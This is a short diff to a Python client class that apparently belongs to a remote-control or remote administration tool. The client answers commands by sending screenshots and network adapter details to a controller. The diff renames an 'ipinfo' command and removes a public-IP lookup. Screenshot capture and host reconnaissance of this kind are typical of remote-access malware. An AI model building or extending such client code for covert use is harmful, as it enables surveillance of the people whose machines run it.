@@ -84,7 +84,7 @@ class CLIENT:
             screenshot = SCREENSHOT()
             self.send_data(screenshot.get_data(), encode=False)
 
-        elif data[0] == "ipinfo":
+        elif data[0] == "networkinfo":
             try:
                 adapters = ifaddr.get_adapters()
                 msg = ""
@@ -96,8 +96,6 @@ class CLIENT:
                         desc = str("   IP: %s/%s" % (ip.ip, ip.network_prefix))
                         msg += desc
                 msg += "\n"
-                ip = requests.get('https://api.ipify.org').text
-                msg += "\nPublic IP address: " + ip + "\n"
                 self.send_data(msg)
             except:
                 msg = "- Could not get network adapters"
